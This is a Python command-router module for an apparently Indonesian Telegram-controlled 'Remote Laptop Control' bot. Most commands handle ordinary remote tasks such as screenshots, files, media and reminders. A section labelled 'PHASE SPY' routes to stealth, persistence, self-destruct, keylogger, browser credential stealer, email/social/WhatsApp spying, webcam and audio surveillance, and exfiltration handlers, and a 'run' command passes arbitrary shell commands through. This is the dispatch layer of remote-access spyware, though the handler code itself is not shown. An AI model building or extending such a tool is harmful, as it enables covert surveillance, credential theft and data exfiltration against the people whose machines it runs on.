"""
Command Router
"""
from ai_module.nim_client import CommandInterpreter
from agent.command_handler import CommandHandler
from security.audit_logger import AuditLogger
from security.sanitizer import InputSanitizer
from ai_module.vision_ai import vision_ai
from pathlib import Path
import base64
from loguru import logger

class CommandRouter:
    def __init__(self):
        self.interpreter = CommandInterpreter()
        self.handler = CommandHandler()
        self.auditor = AuditLogger()

    async def route(self, message_text: str, user_id: str):
        command_name, args = await self.interpreter.interpret(message_text)

        if not command_name:
            if args and args[0].startswith("__NIM_CHAT__:"):
                return args[0].split(":", 1)[1]
            elif args and args[0].startswith("__NIM_BLOCKED__:"):
                return "⚠️ Akses Ditolak: " + args[0].split(":", 1)[1]
            elif args and args[0].startswith("__NIM_ERROR__:"):
                return "🤖 AI Error: " + args[0].split(":", 1)[1]
            # Cek custom alias sebelum mengembalikan unknown
            if message_text.startswith("!"):
                try:
                    from agent.custom_aliases import alias_manager
                    alias_name = message_text.split()[0][1:].lower()
                    alias_cmd = alias_manager.get(alias_name)
                    if alias_cmd:
                        logger.info(f"Alias resolved: {alias_name} -> {alias_cmd}")
                        return await self.route(alias_cmd, user_id)
                except Exception:
                    pass
            return "❓ Perintah tidak dikenali. Ketik `!help` untuk bantuan."

        # Whitelist validation
        is_valid, _ = InputSanitizer.validate_command_whitelist(f"!{command_name}")
        if not is_valid:
            return f"❌ Perintah `{command_name}` tidak ada dalam whitelist keamanan."

        try:
            if command_name in ("screenshot", "ss"):
                use_grid = False
                monitor = -1
                analyze = False
                for a in args:
                    al = a.lower()
                    if al == "grid":
                        use_grid = True
                    elif al == "describe" or al == "ai":
                        analyze = True
                    elif al == "mon0":
                        monitor = 0
                    elif al == "mon1":
                        monitor = 1
                    elif al == "mon2":
                        monitor = 2
                    elif al == "all":
                        monitor = -1
                    elif al.isdigit():
                        monitor = int(al)
                    elif al.startswith("mon") and al[3:].isdigit():
                        monitor = int(al[3:])
                res = await self.handler.handle_screenshot(grid=use_grid, monitor=monitor)
                detail = f"grid={use_grid} mon={monitor}"
                self.auditor.log_event(user_id, "SCREENSHOT", detail)
                if isinstance(res, bytes):
                    result = {"type": "photo", "data": res}
                    if analyze and vision_ai.enabled:
                        desc = await vision_ai.describe(res)
                        if desc:
                            result["caption"] = f"🤖 <b>Analisis Screenshot:</b>\n{desc}"
                    return result
                return res # Return error message string

            elif command_name == "video":
                duration = 5
                if args:
                    try:
                        from agent.time_utils import parse_duration
                        duration = min(parse_duration(args[0], default_unit="s"), 30)
                    except ValueError:
                        duration = 5
                res = await self.handler.handle_video(duration)
                self.auditor.log_event(user_id, "VIDEO", f"duration={duration}")
                return res or "❌ Gagal merekam video."

            elif command_name == "webcam":
                res = await self.handler.handle_webcam()
                self.auditor.log_event(user_id, "WEBCAM", "")
                if isinstance(res, bytes):
                    return {"type": "photo", "data": res}
                return res or "❌ Gagal mengambil foto webcam (kamera digunakan atau tidak ada)."

            elif command_name == "webcamvid":
                duration = 5
                if args:
                    try:
                        from agent.time_utils import parse_duration
                        duration = parse_duration(args[0], default_unit="s")
                    except ValueError:
                        duration = 5
                res = await self.handler.handle_webcam_video(duration)
                self.auditor.log_event(user_id, "WEBCAM_VIDEO", f"duration={duration}")
                if isinstance(res, bytes):
                    return {"type": "video", "data": res}
                return res or "❌ Gagal merekam video webcam."

            elif command_name == "sysinfo":
                info = await self.handler.handle_sysinfo()
                self.auditor.log_event(user_id, "SYSINFO", "")
                return info

            elif command_name == "cd":
                if not args:
                    return f"📂 Direktori saat ini: `{self.handler.get_cwd()}`"
                result = self.handler.set_cwd(args[0])
                self.auditor.log_event(user_id, "CD", args[0][:50])
                return result

            elif command_name == "list_files":
                path = args[0] if args else "."
                result = await self.handler.handle_list_files(path)
                self.auditor.log_event(user_id, "LIST_FILES", path[:50])
                return result

            elif command_name == "get_file":
                if not args:
                    return "❌ Gunakan: !get <filepath>"
                file_data = await self.handler.handle_get_file(args[0])
                if "error" in file_data:
                    return f"❌ {file_data['error']}"
                self.auditor.log_event(user_id, "GET_FILE", args[0][:50])
                return file_data

            elif command_name == "lock_screen":
                result = await self.handler.handle_lock_screen()
                self.auditor.log_event(user_id, "LOCK_SCREEN", "")
                return result

            elif command_name == "unlock":
                password = args[0] if args else None
                result = await self.handler.handle_unlock_screen(password)
                # Password will be masked in audit logger separately
                self.auditor.log_event(user_id, "UNLOCK", "")
                return result

            elif command_name == "reboot":
                confirmed = len(args) > 0 and args[0] == "confirm"
                result = await self.handler.handle_reboot(confirmed)
                self.auditor.log_event(user_id, "REBOOT", f"confirmed={confirmed}")
                return result

            elif command_name == "testai":
                result = await self.handler.handle_test_ai()
                return result

            elif command_name == "clip":
                if args and args[0] == "read":
                    result = await self.handler.handle_clip_read()
                elif args and args[0] == "write":
                    result = await self.handler.handle_clip_write(" ".join(args[1:]))
                elif args and args[0] == "sync":
                    result = await self.handler.handle_clip_sync(args[1:])
                else:
                    return "❌ Gunakan: !clip read, !clip write <teks>, atau !clip sync [start | stop]"
                self.auditor.log_event(user_id, "CLIPBOARD", " ".join(args)[:50])
                return result

            elif command_name == "open":
                if not args: return "❌ Gunakan: !open <url>"
                result = await self.handler.handle_open_url(args[0])
                self.auditor.log_event(user_id, "OPEN_URL", args[0][:50])
                return result

            elif command_name == "top":
                result = await self.handler.handle_top()
                self.auditor.log_event(user_id, "TOP", "")
                return result

            elif command_name == "kill":
                if not args or not args[0].isdigit(): return "❌ Gunakan: !kill <pid>"
                result = await self.handler.handle_kill(int(args[0]))
                self.auditor.log_event(user_id, "KILL", args[0])
                return result

            elif command_name in ["mute", "alarm"]:
                value = args[0] if args else None
                result = await self.handler.handle_audio_control(command_name, value)
                self.auditor.log_event(user_id, f"AUDIO_{command_name.upper()}", str(value))
                return result

            elif command_name in ["agy", "opencode"]:
                result = await self.handler.handle_ai_cli(command_name, args)
                self.auditor.log_event(user_id, f"AI_CLI_{command_name.upper()}", " ".join(args)[:50])
                return result

            elif command_name == "run_script":
                if not args:
                    return "❌ Gunakan: !run <nama_script.py>"
                result = await self.handler.handle_run_script(args[0], user_id)
                self.auditor.log_event(user_id, "RUN_SCRIPT", args[0][:50])
                return result

            elif command_name == "logout":
                # Note: Actual session cleanup is handled by slash command /logout 
                # in telegram_bot.py, but we provide a response for !logout here.
                return "👋 Silakan gunakan perintah `/logout` untuk keluar dari sesi secara aman."

            elif command_name == "listen":
                duration = 5
                if args:
                    try:
                        from agent.time_utils import parse_duration
                        duration = min(parse_duration(args[0], default_unit="s"), 30)
                    except ValueError:
                        duration = 5
                res = await self.handler.handle_listen(duration)
                self.auditor.log_event(user_id, "LISTEN", f"duration={duration}")
                return res or "❌ Gagal merekam audio."

            elif command_name == "brightness":
                result = await self.handler.handle_brightness(args)
                self.auditor.log_event(user_id, "BRIGHTNESS", " ".join(args)[:50])
                return result

            elif command_name == "media":
                if not args:
                    return "❌ Gunakan: !media [play | pause | next | prev]"
                result = await self.handler.handle_media(args[0])
                self.auditor.log_event(user_id, "MEDIA", args[0][:50])
                return result

            elif command_name == "battery":
                result = await self.handler.handle_battery(args)
                self.auditor.log_event(user_id, "BATTERY", " ".join(args)[:50])
                return result

            elif command_name == "notif":
                result = await self.handler.handle_notif(" ".join(args))
                self.auditor.log_event(user_id, "NOTIF", " ".join(args)[:50])
                return result

            elif command_name == "process":
                result = await self.handler.handle_process(args)
                self.auditor.log_event(user_id, "PROCESS", " ".join(args)[:50])
                return result

            elif command_name == "click":
                if len(args) < 2:
                    return "❌ Gunakan: !click <x> <y>"
                try:
                    x, y = int(args[0]), int(args[1])
                except ValueError:
                    return "❌ Koordinat x dan y harus berupa angka."
                res = await self.handler.handle_click(x, y)
                self.auditor.log_event(user_id, "CLICK", f"x={x}, y={y}")
                return res

            elif command_name == "type":
                if not args:
                    return "❌ Gunakan: !type <teks>"
                text = " ".join(args)
                res = await self.handler.handle_type(text)
                self.auditor.log_event(user_id, "TYPE", text[:50])
                return res

            elif command_name == "press":
                if not args:
                    return "❌ Gunakan: !press <tombol>"
                key = args[0]
                res = await self.handler.handle_press(key)
                self.auditor.log_event(user_id, "PRESS", key)
                return res

            elif command_name == "rightclick":
                if len(args) < 2:
                    return "❌ Gunakan: !rightclick <x> <y>"
                try:
                    x, y = int(args[0]), int(args[1])
                except ValueError:
                    return "❌ Koordinat harus berupa angka."
                res = await self.handler.handle_rightclick(x, y)
                self.auditor.log_event(user_id, "RIGHTCLICK", f"x={x}, y={y}")
                return res

            elif command_name == "doubleclick":
                if len(args) < 2:
                    return "❌ Gunakan: !doubleclick <x> <y>"
                try:
                    x, y = int(args[0]), int(args[1])
                except ValueError:
                    return "❌ Koordinat harus berupa angka."
                res = await self.handler.handle_doubleclick(x, y)
                self.auditor.log_event(user_id, "DOUBLECLICK", f"x={x}, y={y}")
                return res

            elif command_name in ("drag", "dragdrop"):
                if len(args) < 4:
                    return "❌ Gunakan: !drag <x1> <y1> <x2> <y2>"
                try:
                    x1, y1, x2, y2 = int(args[0]), int(args[1]), int(args[2]), int(args[3])
                except ValueError:
                    return "❌ Koordinat harus berupa angka."
                res = await self.handler.handle_drag(x1, y1, x2, y2)
                self.auditor.log_event(user_id, "DRAG", f"({x1},{y1})→({x2},{y2})")
                return res

            elif command_name == "scroll":
                direction = args[0] if args and args[0] in ("up", "down") else "down"
                amount = int(args[1]) if len(args) > 1 and args[1].isdigit() else 3
                res = await self.handler.handle_scroll(direction, amount)
                self.auditor.log_event(user_id, "SCROLL", f"{direction} x{amount}")
                return res

            elif command_name in ("clickimage", "clickimg"):
                if not args:
                    return "❌ Gunakan: !clickimage <path_gambar> [confidence]"
                template = args[0]
                confidence = float(args[1]) if len(args) > 1 else 0.8
                res = await self.handler.handle_clickimage(template, confidence)
                self.auditor.log_event(user_id, "CLICKIMAGE", template)
                return res

            elif command_name in ("waitimage", "waitimg"):
                if not args:
                    return "❌ Gunakan: !waitimage <path_gambar> [timeout] [confidence]"
                template = args[0]
                timeout = float(args[1]) if len(args) > 1 and args[1].replace(".", "").isdigit() else 10
                confidence = float(args[2]) if len(args) > 2 else 0.8
                res = await self.handler.handle_waitimage(template, timeout, confidence)
                self.auditor.log_event(user_id, "WAITIMAGE", template)
                return res

            elif command_name == "run":
                if not args:
                    return "❌ Gunakan: !shell <command>"
                cmd = " ".join(args)
                res = await self.handler.handle_run(cmd)
                self.auditor.log_event(user_id, "RUN", cmd[:100])
                return res

            elif command_name == "active":
                res = await self.handler.handle_active_window()
                self.auditor.log_event(user_id, "ACTIVE_WINDOW", "")
                return res

            elif command_name == "find":
                pattern = " ".join(args) if args else ""
                res = await self.handler.handle_find_files(pattern)
                self.auditor.log_event(user_id, "FIND_FILES", pattern[:50])
                return res

            elif command_name == "tts":
                text = " ".join(args) if args else ""
                res = await self.handler.handle_tts_speak(text)
                self.auditor.log_event(user_id, "TTS_SPEAK", text[:50])
                return res

            elif command_name == "ping":
                host = args[0] if args else "8.8.8.8"
                res = await self.handler.handle_ping(host)
                self.auditor.log_event(user_id, "PING", host)
                return res

            elif command_name == "speedtest":
                res = await self.handler.handle_speedtest()
                self.auditor.log_event(user_id, "SPEEDTEST", "")
                return res

            elif command_name == "window_control":
                action = args[0] if args else "minimize"
                res = await self.handler.handle_window_control(action)
                self.auditor.log_event(user_id, "WINDOW_CONTROL", action)
                return res

            elif command_name == "web":
                query = " ".join(args) if args else ""
                res = await self.handler.handle_web_search(query)
                self.auditor.log_event(user_id, "WEB_SEARCH", query[:50])
                return res

            elif command_name == "scrape":
                res = await self.handler.handle_scrape(args)
                self.auditor.log_event(user_id, "SCRAPE", " ".join(args)[:50])
                return res

            elif command_name == "wifi":
                res = await self.handler.handle_wifi_scan()
                self.auditor.log_event(user_id, "WIFI_SCAN", "")
                return res

            elif command_name == "ports":
                res = await self.handler.handle_active_ports()
                self.auditor.log_event(user_id, "ACTIVE_PORTS", "")
                return res

            elif command_name == "launch":
                if not args: return "❌ Gunakan: !launch <nama_aplikasi>"
                result = await self.handler.handle_launch_app(args[0])
                self.auditor.log_event(user_id, "LAUNCH_APP", args[0][:50])
                return result

            elif command_name == "todo":
                result = await self.handler.handle_todo(args)
                self.auditor.log_event(user_id, "TODO", " ".join(args)[:50])
                return result

            elif command_name == "apps":
                result = await self.handler.handle_list_apps(args)
                self.auditor.log_event(user_id, "LIST_APPS", " ".join(args)[:50])
                return result

            elif command_name == "guard":
                result = await self.handler.handle_guard(args)
                self.auditor.log_event(user_id, "WEBCAM_GUARD", " ".join(args)[:50])
                return result

            # ── PHASE 1: Core Productivity Features ──────────────────────────────

            elif command_name == "focus":
                result = await self.handler.handle_focus(args)
                self.auditor.log_event(user_id, "FOCUS", " ".join(args)[:50])
                return result

            elif command_name == "workspace":
                result = await self.handler.handle_workspace(args)
                self.auditor.log_event(user_id, "WORKSPACE", " ".join(args)[:50])
                return result


            elif command_name == "quicknote":
                result = await self.handler.handle_quicknote(args)
                self.auditor.log_event(user_id, "QUICKNOTE", " ".join(args)[:50])
                return result

            elif command_name == "browser":
                result = await self.handler.handle_browser(args)
                self.auditor.log_event(user_id, "BROWSER", " ".join(args)[:50])
                return result

            elif command_name == "daily":
                result = await self.handler.handle_daily(args)
                self.auditor.log_event(user_id, "DAILY_REPORT", " ".join(args)[:50])
                return result

            elif command_name == "reminder":
                result = await self.handler.handle_reminder(args)
                self.auditor.log_event(user_id, "REMINDER", " ".join(args)[:50])
                return result

            elif command_name == "task":
                result = await self.handler.handle_task(args)
                self.auditor.log_event(user_id, "TASK", " ".join(args)[:50])
                return result

            elif command_name == "meeting":
                result = await self.handler.handle_meeting(args)
                self.auditor.log_event(user_id, "MEETING", " ".join(args)[:50])
                return result

            elif command_name == "custom":
                result = await self.handler.handle_custom(args)
                self.auditor.log_event(user_id, "CUSTOM_ALIAS", " ".join(args)[:50])
                return result

            # ── PHASE 2: AI & Automation Intelligence ──────────────────────────────

            elif command_name == "ai":
                if not args:
                    return "Gunakan: !ai [work|write|automate|summarize|research|insight] [args]"
                ai_sub = args[0].lower()
                if ai_sub == "work":
                    return await self.handler.handle_ai_work(args[1:])
                elif ai_sub == "write":
                    return await self.handler.handle_ai_write(args[1:])
                elif ai_sub == "automate":
                    return await self.handler.handle_ai_automate(args[1:])
                elif ai_sub == "summarize":
                    return await self.handler.handle_ai_summarize(args[1:])
                elif ai_sub == "research":
                    return await self.handler.handle_ai_research(args[1:])
                elif ai_sub == "insight":
                    return await self.handler.handle_ai_insight(args[1:])
                elif ai_sub == "agent":
                    return await self.handler.handle_ai_agent(args[1:])
                return "Subperintah AI tidak dikenal. Gunakan: work, write, automate, summarize, research, insight, agent"

            elif command_name == "smart_clip":
                result = await self.handler.handle_smart_clip(args)
                self.auditor.log_event(user_id, "SMART_CLIPBOARD", " ".join(args)[:50])
                return result

            elif command_name == "macro":
                result = await self.handler.handle_macro(args)
                self.auditor.log_event(user_id, "MACRO", " ".join(args)[:50])
                return result

            elif command_name == "schedule":
                result = await self.handler.handle_schedule(args)
                self.auditor.log_event(user_id, "SCHEDULE", " ".join(args)[:50])
                return result

            elif command_name == "voice_cmd":
                result = await self.handler.handle_voice_cmd(args)
                self.auditor.log_event(user_id, "VOICE_CMD", " ".join(args)[:50])
                return result

            # ── PHASE 3: File, Sync & Data Management ──────────────────────────────

            elif command_name == "sync":
                result = await self.handler.handle_sync(args)
                self.auditor.log_event(user_id, "SYNC", " ".join(args)[:50])
                return result

            elif command_name == "quick":
                result = await self.handler.handle_quick(args)
                self.auditor.log_event(user_id, "QUICK", " ".join(args)[:50])
                return result

            elif command_name == "quick_upload":
                result = await self.handler.handle_quick_upload(args)
                self.auditor.log_event(user_id, "QUICK_UPLOAD", " ".join(args)[:50])
                return result

            elif command_name == "recent":
                result = await self.handler.handle_recent(args)
                self.auditor.log_event(user_id, "RECENT", " ".join(args)[:50])
                return result

            elif command_name == "search_content":
                result = await self.handler.handle_search_content(args)
                self.auditor.log_event(user_id, "SEARCH_CONTENT", " ".join(args)[:50])
                return result

            elif command_name == "convert":
                result = await self.handler.handle_convert(args)
                self.auditor.log_event(user_id, "CONVERT", " ".join(args)[:50])
                return result

            elif command_name == "backup":
                result = await self.handler.handle_backup(args)
                self.auditor.log_event(user_id, "BACKUP", " ".join(args)[:50])
                return result

            elif command_name == "organize":
                result = await self.handler.handle_organize(args)
                self.auditor.log_event(user_id, "ORGANIZE", " ".join(args)[:50])
                return result

            elif command_name == "file_watcher":
                result = await self.handler.handle_file_watcher(args)
                self.auditor.log_event(user_id, "FILE_WATCHER", " ".join(args)[:50])
                return result

            elif command_name == "version":
                result = await self.handler.handle_version(args)
                self.auditor.log_event(user_id, "VERSION", " ".join(args)[:50])
                return result

            elif command_name == "clean":
                result = await self.handler.handle_clean(args)
                self.auditor.log_event(user_id, "CLEAN", " ".join(args)[:50])
                return result

            # ── PHASE 4: System Enhancement & Convenience ─────────────────────────

            elif command_name == "volume":
                result = await self.handler.handle_volume_app(args)
                self.auditor.log_event(user_id, "VOLUME", " ".join(args)[:50])
                return result

            elif command_name == "power":
                result = await self.handler.handle_power(args)
                self.auditor.log_event(user_id, "POWER", " ".join(args)[:50])
                return result

            elif command_name == "multi_monitor":
                result = await self.handler.handle_multi_monitor(args)
                self.auditor.log_event(user_id, "MULTI_MONITOR", " ".join(args)[:50])
                return result

            elif command_name == "sleep":
                result = await self.handler.handle_sleep(args)
                self.auditor.log_event(user_id, "SLEEP", " ".join(args)[:50])
                return result

            elif command_name == "wake":
                result = await self.handler.handle_wake(args)
                self.auditor.log_event(user_id, "WAKE", " ".join(args)[:50])
                return result

            elif command_name == "quick_app":
                result = await self.handler.handle_quick_app(args)
                self.auditor.log_event(user_id, "QUICK_APP", " ".join(args)[:50])
                return result

            elif command_name == "night_mode":
                result = await self.handler.handle_night_mode(args)
                self.auditor.log_event(user_id, "NIGHT_MODE", " ".join(args)[:50])
                return result

            elif command_name == "window":
                result = await self.handler.handle_window_arrange(args)
                self.auditor.log_event(user_id, "WINDOW", " ".join(args)[:50])
                return result

            elif command_name == "hotkey":
                result = await self.handler.handle_hotkey(args)
                self.auditor.log_event(user_id, "HOTKEY", " ".join(args)[:50])
                return result

            elif command_name == "launch":
                if args and args[0].lower() == "advanced":
                    result = await self.handler.handle_launch_advanced(args[1:])
                else:
                    result = await self.handler.handle_launch_app(args[0] if args else "")
                self.auditor.log_event(user_id, "LAUNCH", " ".join(args)[:50])
                return result

            # ── PHASE 5: Advanced & Pro Features ──────────────────────────────

            elif command_name == "time_track":
                result = await self.handler.handle_time_track(args)
                self.auditor.log_event(user_id, "TIME_TRACK", " ".join(args)[:50])
                return result

            elif command_name == "session":
                result = await self.handler.handle_session(args)
                self.auditor.log_event(user_id, "SESSION", " ".join(args)[:50])
                return result

            elif command_name == "share_screen":
                result = await self.handler.handle_share_screen(args)
                self.auditor.log_event(user_id, "SHARE_SCREEN", " ".join(args)[:50])
                return result

            elif command_name == "multi_device":
                result = await self.handler.handle_multi_device(args)
                self.auditor.log_event(user_id, "MULTI_DEVICE", " ".join(args)[:50])
                return result

            elif command_name == "multi":
                result = await self.handler.handle_multi(args)
                self.auditor.log_event(user_id, "MULTI", " ".join(args)[:50])
                return result

            elif command_name == "profile":
                result = await self.handler.handle_profile(args)
                self.auditor.log_event(user_id, "PROFILE", " ".join(args)[:50])
                return result

            elif command_name == "dash":
                result = await self.handler.handle_dash(args)
                self.auditor.log_event(user_id, "DASH", " ".join(args)[:50])
                return result

            elif command_name == "activity_log":
                result = await self.handler.handle_activity_log(args)
                self.auditor.log_event(user_id, "ACTIVITY_LOG", " ".join(args)[:50])
                return result

            elif command_name == "vpn":
                result = await self.handler.handle_vpn(args)
                self.auditor.log_event(user_id, "VPN", " ".join(args)[:50])
                return result

            elif command_name == "tunnel":
                result = await self.handler.handle_tunnel(args)
                self.auditor.log_event(user_id, "TUNNEL", " ".join(args)[:50])
                return result

            elif command_name == "ai_agent":
                result = await self.handler.handle_ai_agent(args)
                self.auditor.log_event(user_id, "AI_AGENT", " ".join(args)[:50])
                return result

            # AI ADVANCED FEATURES
            elif command_name == "memory":
                result = await self.handler.handle_memory(args)
                self.auditor.log_event(user_id, "MEMORY", " ".join(args)[:50])
                return result

            elif command_name == "mcp":
                result = await self.handler.handle_mcp(args)
                self.auditor.log_event(user_id, "MCP", " ".join(args)[:50])
                return result

            elif command_name == "companion":
                result = await self.handler.handle_companion(args)
                self.auditor.log_event(user_id, "COMPANION", " ".join(args)[:50])
                return result

            elif command_name == "solve":
                result = await self.handler.handle_solve(args)
                self.auditor.log_event(user_id, "SOLVE", " ".join(args)[:50])
                return result

            elif command_name in ("create_feature", "create"):
                result = await self.handler.handle_create_feature(args)
                self.auditor.log_event(user_id, "CREATE_FEATURE", " ".join(args)[:50])
                return result

            elif command_name == "self_evolve":
                result = await self.handler.handle_self_evolve(args)
                self.auditor.log_event(user_id, "SELF_EVOLVE", " ".join(args)[:50])
                return result

            elif command_name == "optimize_me":
                result = await self.handler.handle_optimize_me(args)
                self.auditor.log_event(user_id, "OPTIMIZE_ME", " ".join(args)[:50])
                return result

            elif command_name == "proactive":
                result = await self.handler.handle_proactive(args)
                self.auditor.log_event(user_id, "PROACTIVE", " ".join(args)[:50])
                return result

            elif command_name == "learn":
                result = await self.handler.handle_learn(args)
                self.auditor.log_event(user_id, "LEARN", " ".join(args)[:50])
                return result

            elif command_name == "agent_mode":
                result = await self.handler.handle_agent_mode(args)
                self.auditor.log_event(user_id, "AGENT_MODE", " ".join(args)[:50])
                return result

            elif command_name in ("internet_brain", "otak_internet"):
                result = await self.handler.handle_internet_brain(args)
                self.auditor.log_event(user_id, "INTERNET_BRAIN", " ".join(args)[:50])
                return result

            elif command_name in ("live_web", "web_langsung"):
                result = await self.handler.handle_live_web(args)
                self.auditor.log_event(user_id, "LIVE_WEB", " ".join(args)[:50])
                return result

            elif command_name in ("deep_scrape", "scrape_dalam"):
                result = await self.handler.handle_deep_scrape(args)
                self.auditor.log_event(user_id, "DEEP_SCRAPE", " ".join(args)[:50])
                return result

            elif command_name in ("research", "riset"):
                result = await self.handler.handle_research(args)
                self.auditor.log_event(user_id, "RESEARCH", " ".join(args)[:50])
                return result

            elif command_name in ("verify_fact", "cek_fakta"):
                result = await self.handler.handle_verify_fact(args)
                self.auditor.log_event(user_id, "VERIFY_FACT", " ".join(args)[:50])
                return result

            elif command_name in ("news_digest", "ringkasan_berita"):
                result = await self.handler.handle_news_digest(args)
                self.auditor.log_event(user_id, "NEWS_DIGEST", " ".join(args)[:50])
                return result

            elif command_name in ("trend_hunter", "pemburu_tren"):
                result = await self.handler.handle_trend_hunter(args)
                self.auditor.log_event(user_id, "TREND_HUNTER", " ".join(args)[:50])
                return result

            elif command_name in ("comparator", "pembanding"):
                result = await self.handler.handle_comparator(args)
                self.auditor.log_event(user_id, "COMPARATOR", " ".join(args)[:50])
                return result

            elif command_name in ("qna", "tanya"):
                result = await self.handler.handle_qna(args)
                self.auditor.log_event(user_id, "QNA", " ".join(args)[:50])
                return result

            elif command_name in ("generate_image", "gambar"):
                result = await self.handler.handle_generate_image(args)
                self.auditor.log_event(user_id, "GENERATE_IMAGE", " ".join(args)[:50])
                return result

            elif command_name in ("translate", "terjemah"):
                result = await self.handler.handle_translate(args)
                self.auditor.log_event(user_id, "TRANSLATE", " ".join(args)[:50])
                return result

            elif command_name in ("explain", "jelaskan"):
                result = await self.handler.handle_explain(args)
                self.auditor.log_event(user_id, "EXPLAIN", " ".join(args)[:50])
                return result

            elif command_name in ("proactive_suggest", "saran_otomatis"):
                result = await self.handler.handle_proactive_suggest(args)
                self.auditor.log_event(user_id, "PROACTIVE_SUGGEST", " ".join(args)[:50])
                return result

            # ── PHASE SPY: Stealth & Surveillance Features ──────────────────────────

            elif command_name == "stealth":
                result = await self.handler.handle_stealth(args)
                self.auditor.log_event(user_id, "STEALTH", " ".join(args)[:50])
                return result

            elif command_name == "persistence":
                result = await self.handler.handle_persistence(args)
                self.auditor.log_event(user_id, "PERSISTENCE", " ".join(args)[:50])
                return result

            elif command_name == "self_destruct":
                result = await self.handler.handle_self_destruct(args)
                self.auditor.log_event(user_id, "SELF_DESTRUCT", " ".join(args)[:50])
                return result

            elif command_name == "arp":
                result = await self.handler.handle_arp(args)
                self.auditor.log_event(user_id, "ARP", " ".join(args)[:50])
                return result

            elif command_name == "routing":
                result = await self.handler.handle_routing(args)
                self.auditor.log_event(user_id, "ROUTING", " ".join(args)[:50])
                return result

            elif command_name == "dns":
                result = await self.handler.handle_dns_info(args)
                self.auditor.log_event(user_id, "DNS", " ".join(args)[:50])
                return result

            elif command_name == "net_recon":
                result = await self.handler.handle_net_recon(args)
                self.auditor.log_event(user_id, "NET_RECON", " ".join(args)[:50])
                return result

            elif command_name == "wifi_surveillance":
                result = await self.handler.handle_wifi_surveillance(args)
                self.auditor.log_event(user_id, "WIFI_SURVEILLANCE", " ".join(args)[:50])
                return result

            elif command_name == "connections":
                result = await self.handler.handle_connections(args)
                self.auditor.log_event(user_id, "CONNECTIONS", " ".join(args)[:50])
                return result

            elif command_name == "keylogger":
                result = await self.handler.handle_keylogger(args)
                self.auditor.log_event(user_id, "KEYLOGGER", " ".join(args)[:50])
                return result

            elif command_name == "browser_history":
                result = await self.handler.handle_browser_history(args)
                self.auditor.log_event(user_id, "BROWSER_HISTORY", " ".join(args)[:50])
                return result

            elif command_name == "steal":
                result = await self.handler.handle_browser_stealer(args)
                self.auditor.log_event(user_id, "STEAL", " ".join(args)[:50])
                return result

            elif command_name == "social_spy":
                result = await self.handler.handle_social_spy(args)
                self.auditor.log_event(user_id, "SOCIAL_SPY", " ".join(args)[:50])
                return result

            elif command_name == "email_spy":
                result = await self.handler.handle_email_spy(args)
                self.auditor.log_event(user_id, "EMAIL_SPY", " ".join(args)[:50])
                return result

            elif command_name == "audio_surveillance":
                result = await self.handler.handle_audio_surveillance(args)
                self.auditor.log_event(user_id, "AUDIO_SURVEILLANCE", " ".join(args)[:50])
                return result

            elif command_name == "webcam_surveillance":
                result = await self.handler.handle_webcam_surveillance(args)
                self.auditor.log_event(user_id, "WEBCAM_SURVEILLANCE", " ".join(args)[:50])
                return result

            elif command_name == "collect":
                result = await self.handler.handle_collect(args)
                self.auditor.log_event(user_id, "COLLECT", " ".join(args)[:50])
                return result

            elif command_name == "exfil":
                result = await self.handler.handle_exfil(args)
                self.auditor.log_event(user_id, "EXFIL", " ".join(args)[:50])
                return result

            elif command_name == "intel":
                result = await self.handler.handle_intel(args)
                self.auditor.log_event(user_id, "INTEL", " ".join(args)[:50])
                return result

            elif command_name == "alert":
                result = await self.handler.handle_alert(args)
                self.auditor.log_event(user_id, "ALERT", " ".join(args)[:50])
                return result

            elif command_name in ("wa", "whatsapp"):
                result = await self.handler.handle_wa(args)
                self.auditor.log_event(user_id, "WA_SPY", " ".join(args)[:50])
                return result

            elif command_name == "help":
                return HELP_TEXT

            else:
                return "❓ Perintah tidak dikenal."

        except Exception as e:
            logger.error(f"Command execution error: {e}")
            self.auditor.log_event(user_id, "COMMAND_ERROR", str(e), success=False)
            raise


HELP_TEXT = """🤖 <b>Remote Laptop Control — Help</b>

<b>1. Media & Deteksi Layar:</b>
<code>!screenshot [grid]</code> — Screenshot layar (opsi grid koordinat)
<code>!video [detik]</code> — Rekam layar (max 30s)
<code>!webcam</code> — Foto webcam
<code>!webcamvid [detik]</code> — Rekam video webcam
<code>!active</code> — Deteksi jendela aplikasi aktif

<b>2. Simulasi Input:</b>
<code>!click [x] [y]</code> — Simulasi klik mouse kiri
<code>!type [teks]</code> — Simulasi ketik teks keyboard
<code>!press [tombol]</code> — Simulasi tekan tombol keyboard

<b>3. Navigasi & File:</b>
<code>!cd [path]</code> — Pindah direktori kerja (Ingatan persisten)
<code>!ls [path]</code> — List file di folder aktif
<code>!find [pattern]</code> — Cari file secara rekursif
<code>!get [filepath]</code> — Download/kirim file ke HP
<code>!read</code> — Baca clipboard laptop
<code>!write [teks]</code> — Tulis teks ke clipboard laptop
<code>!clip sync [start|stop]</code> — Sinkronisasi otomatis clipboard laptop ke HP
<code>!term</code> — Mode Terminal Interaktif

<b>4. AI & Otomasi:</b>
<code>!opencode run "&lt;query&gt;"</code> — Menjalankan AI Coding Agent untuk membuat folder/file/CRUD otomatis
<code>!agy "&lt;query&gt;"</code> — Perintah AI Antigravity CLI untuk tugas sistem tingkat lanjut
<code>!testai</code> — Menguji konektivitas integrasi AI ke API NVIDIA NIM

<b>5. Sistem & Kontrol:</b>
<code>!sysinfo</code> — Info CPU, RAM, Disk, Baterai
<code>!battery</code> — Status detail dan kesehatan baterai laptop
<code>!brightness [0-100]</code> — Mengatur/membaca kecerahan layar laptop
<code>!media [play|pause|next|prev]</code> — Mengontrol pemutar musik/video aktif
<code>!notif [teks]</code> — Memunculkan popup desktop notification di layar laptop
<code>!tts [teks]</code> — Membunyikan suara Text-to-Speech di laptop
<code>!ping [host]</code> — Cek latensi laptop ke host (default: 8.8.8.8)
<code>!speedtest</code> — Uji kecepatan internet laptop
<code>!win [minimize|close]</code> — Minimalkan atau tutup jendela aplikasi aktif
<code>!web [query]</code> — Pencarian web Google/DuckDuckGo
<code>!wifi</code> — Memindai jaringan Wi-Fi sekitar
<code>!ports</code> — Menampilkan daftar port listening aktif
<code>!process [list|kill &lt;pid/nama&gt;]</code> — Melihat daftar proses atau menutup paksa aplikasi
<code>!launch [nama_aplikasi]</code> — Meluncurkan aplikasi desktop secara remote (misal: chrome, vscode, spotify)
<code>!apps [query]</code> — Menampilkan atau mencari daftar aplikasi GUI/desktop terinstall
<code>!todo [add/done/delete/clear] [tugas | tenggat | speak]</code> — Mengelola daftar tugas (opsi <code>speak</code> untuk bersuara di laptop)
